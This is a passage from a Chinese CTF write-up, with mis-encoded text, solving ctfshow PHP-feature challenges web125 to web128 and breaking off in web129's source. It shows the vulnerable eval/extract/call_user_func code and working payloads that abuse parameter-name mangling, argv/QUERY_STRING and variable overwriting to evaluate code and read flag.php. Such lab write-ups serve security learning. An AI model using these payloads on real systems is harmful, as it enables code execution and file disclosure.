</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fun&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW.COM&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fl0g&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?/&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nv">$c</span><span class="o">&lt;=</span><span class="mi">18</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">         <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$c</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;;&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="ln">21</span><span class="cl">         <span class="k">if</span><span class="p">(</span><span class="nv">$fl0g</span><span class="o">===</span><span class="s2">&#34;flag_give_me&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">             <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é¢˜å…¶å®æ ¹æœ¬ä¸ç”¨ç†ä¼š</p>
<pre tabindex="0"><code>         if($fl0g===&#34;flag_give_me&#34;){
             echo $flag;
         }
</code></pre><p>è¿™é¢˜å¯¹cè¿›è¡Œäº†ä¸€å®šçš„é™åˆ¶ï¼Œä½†æ˜¯å½±å“ä¸å¤§æˆ‘ä»¬å¯ä»¥ç›´æ¥å†evalå¤„æ‰§è¡Œecho $flag;ä»è€Œæ‹¿åˆ°flag</p>
<p>è¿™é¢˜è¿˜æœ‰ä¸€ä¸ªè€ƒç‚¹ï¼Œç”±äºåœ¨phpä¸­å˜é‡ååªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ï¼Œè¢«getæˆ–è€…postä¼ å…¥çš„å˜é‡åï¼Œå¦‚æœå«æœ‰ç©ºæ ¼ã€+ã€[åˆ™ä¼šè¢«è½¬åŒ–ä¸º_ï¼Œæ‰€ä»¥æŒ‰ç†æ¥è¯´æˆ‘ä»¬æ„é€ ä¸å‡ºCTF_SHOW.COMè¿™ä¸ªå˜é‡(å› ä¸ºå«æœ‰.)ï¼Œä½†phpä¸­æœ‰ä¸ªç‰¹æ€§å°±æ˜¯å¦‚æœä¼ å…¥[ï¼Œå®ƒè¢«è½¬åŒ–ä¸º_ä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢</p>
<p>payload:</p>
<pre tabindex="0"><code>POST:CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun= echo $flag
</code></pre><h4 id="web125">web125<a hidden class="anchor" aria-hidden="true" href="#web125">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">#
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">#
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fun&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW.COM&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fl0g&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nv">$c</span><span class="o">&lt;=</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">         <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$c</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">         <span class="k">if</span><span class="p">(</span><span class="nv">$fl0g</span><span class="o">===</span><span class="s2">&#34;flag_give_me&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">             <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é¢˜æŠŠä¸Šé¢˜çš„echoæ–¹æ³•å’Œflagå…³é”®è¯banäº†</p>
<p>è€ƒè™‘é€šè¿‡äºŒæ¬¡ä¼ å‚çš„æ–¹æ³•è¯»flag</p>
<p>æˆ‘ä¸€å¼€å§‹è€ƒè™‘äº†systemäºŒæ¬¡ä¼ å‚çš„æ–¹æ³•ï¼Œä½†æ˜¯systemæ–¹æ³•åº”è¯¥æ˜¯è¢«banæ‰äº†</p>
<p>åé¢å°è¯•highlight_fileæ–¹æ³•æˆåŠŸè¯»åˆ°flag</p>
<p>payload:</p>
<pre tabindex="0"><code>POST CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=highlight_file($_GET[1])
GET 1=flag.php
</code></pre><p>å…¶ä»–çš„ payloadï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">POST</span> <span class="nx">CTF_SHOW</span><span class="o">=&amp;</span><span class="nx">CTF</span><span class="p">[</span><span class="nx">SHOW</span><span class="o">.</span><span class="nx">COM</span><span class="o">=&amp;</span><span class="nx">fun</span><span class="o">=</span><span class="nx">var_export</span><span class="p">(</span><span class="nx">get_defined_vars</span><span class="p">())</span>
</span></span></code></pre></div><h4 id="web126">web126<a hidden class="anchor" aria-hidden="true" href="#web126">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">#
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">#
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fun&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW.COM&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fl0g&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">         <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$c</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;;&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="ln">20</span><span class="cl">         <span class="k">if</span><span class="p">(</span><span class="nv">$fl0g</span><span class="o">===</span><span class="s2">&#34;flag_give_me&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">             <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>åŸºæœ¬ä¸Šbanæ‰äº†èƒ½è¯»æ–‡ä»¶çš„å‡½æ•°</p>
<p>å‚è€ƒ<a href="https://blog.csdn.net/Myon5/article/details/140464776">ctfshow-webå…¥é—¨-phpç‰¹æ€§ï¼ˆweb123ã€web125ã€web126ï¼‰_ctfshow web123-CSDNåšå®¢</a></p>
<p>payload:</p>
<pre tabindex="0"><code>getï¼š?$fl0g=flag_give_me;
postï¼šCTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])
or
GET:?$fl0g=flag_give_me
POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0])
</code></pre><p>è¿™é‡Œçš„æŸ¥è¯¢å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å« fl0gï¼Œä½†åŒ…å«äº† $fl0gã€‚ç”±äº PHP ä¸­çš„å˜é‡åä¸åŒ…æ‹¬ $ ç¬¦å·ï¼Œæ‰€ä»¥ isset($_GET[&lsquo;fl0g&rsquo;]) ä»ç„¶ä¼šè¿”å› falseï¼Œå³æ²¡æœ‰æ£€æµ‹åˆ° fl0g å‚æ•°ã€‚</p>
<p>post ä¼ å…¥ CTF_SHOW å’Œ CTF_SHOW.COM ç¡®ä¿ isset($_POST[&lsquo;CTF_SHOW&rsquo;]) &amp;&amp; isset($_POST[&lsquo;CTF_SHOW.COM&rsquo;]) è¿™éƒ¨åˆ†æ¡ä»¶ä¸ºçœŸï¼Œfun=eval($a[0]) å°† eval($a[0]) çš„ä»£ç ä¼ é€’ç»™ $cã€‚</p>
<p>å‡†ç¡®æ¥è¯´ï¼Œæ­¤æ—¶çš„ $_SERVER[â€˜argvâ€™][0] å°±ç­‰äº $_SERVER[â€˜QUERY_STRINGâ€™]ï¼Œ$_SERVER[&ldquo;QUERY_STRING&rdquo;] å°±æ˜¯æŸ¥è¯¢ (query) çš„å­—ç¬¦ä¸²ï¼Œè¿™æ˜¯ç”±äº php.ini å¼€å¯äº†register_argc_argv é…ç½®é¡¹ã€‚</p>
<p>å½“è®¿é—® ?$fl0g=flag_give_me; æ—¶ï¼ŒæœåŠ¡å™¨é…ç½®ä½¿å¾—æŸ¥è¯¢å­—ç¬¦ä¸²è¢«ä¼ é€’åˆ° $_SERVER[&lsquo;argv&rsquo;] ä¸­ã€‚
åœ¨è¿™ç§é…ç½®ä¸‹ï¼Œ$_SERVER[&lsquo;argv&rsquo;][0] åŒ…å«äº†æ•´ä¸ªæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå³ &lsquo;$fl0g=flag_give_me;&rsquo;ã€‚</p>
<p>åœ¨ eval(&quot;$c;&rdquo;); ä¸­å®é™…æ‰§è¡Œçš„æ˜¯ eval(&rsquo;eval($a[0]);&rsquo;);ï¼Œå› ä¸º $a[0] æ˜¯ &lsquo;$fl0g=flag_give_me;&rsquo;ï¼Œè¿™ç›¸å½“äºæ‰§è¡Œäº† eval(&rsquo;$fl0g=flag_give_me;&rsquo;);ï¼Œè¿™æ ·å°±å®šä¹‰äº†å˜é‡ $fl0g å¹¶èµ‹å€¼ä¸º &lsquo;flag_give_me&rsquo;ã€‚</p>
<p>æœ€å åˆ¤æ–­ if($fl0g === &ldquo;flag_give_me&rdquo;)ï¼Œå› ä¸º $fl0g è¢«æ­£ç¡®åœ°è®¾ç½®ä¸ºäº† &lsquo;flag_give_me&rsquo;ï¼Œæ‰€ä»¥è¿™ä¸ªæ¡ä»¶ä¸ºçœŸï¼Œå› æ­¤ï¼Œecho $flag; è¢«æ‰§è¡Œï¼Œè¾“å‡º $flagã€‚</p>
<p>å…¶ä»–payload:</p>
<pre tabindex="0"><code>GET:?a=1+fl0g=flag_give_me
POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])
</code></pre><p>ä¹ŸåŒæ ·æ˜¯ä¸ºäº†ä½¿fl0g=flag_give_me</p>
<h4 id="web127">web127<a hidden class="anchor" aria-hidden="true" href="#web127">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-10 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-10 21:52:49
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$ctf_show</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\&#39;|\&#34;|\&lt;|\,|\&gt;|\.|\\\|\//&#39;</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">waf</span><span class="p">(</span><span class="nv">$url</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;å—¯å“¼ï¼Ÿ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">
</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$ctf_show</span><span class="o">===</span><span class="s1">&#39;ilove36d&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å˜é‡è¦†ç›–</p>
<p>ç”±äºä¸‹åˆ’çº¿è¢«wafäº†ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ ctf%20showï¼Œphpä¼šå°†ç©ºæ ¼è§£ææˆ_</p>
<p>payload:</p>
<pre tabindex="0"><code>ctf%20show=ilove36d
</code></pre><h4 id="web128">web128<a hidden class="anchor" aria-hidden="true" href="#web128">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-10 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-12 19:49:05
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$f1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$f2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">check</span><span class="p">(</span><span class="nv">$f1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">var_dump</span><span class="p">(</span><span class="nx">call_user_func</span><span class="p">(</span><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$f1</span><span class="p">,</span><span class="nv">$f2</span><span class="p">)));</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;å—¯å“¼ï¼Ÿ&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">return</span> <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]|[a-z]/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="p">}</span> 
</span></span></code></pre></div><p>ä»€ä¹ˆæ˜¯Gettextå‡½æ•°</p>
<p><a href="https://www.php.net/manual/zh/book.gettext.php">PHP: Gettext - Manual</a></p>
<p>éªšæ“ä½œ</p>
<pre tabindex="0"><code>å°çŸ¥è¯†ç‚¹ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°

_()==gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll

get_defined_vars()å‡½æ•°

get_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag

payload: ?f1=_&amp;f2=get_defined_vars
</code></pre><h4 id="web129">web129<a hidden class="anchor" aria-hidden="true" href="#web129">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 03:18:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
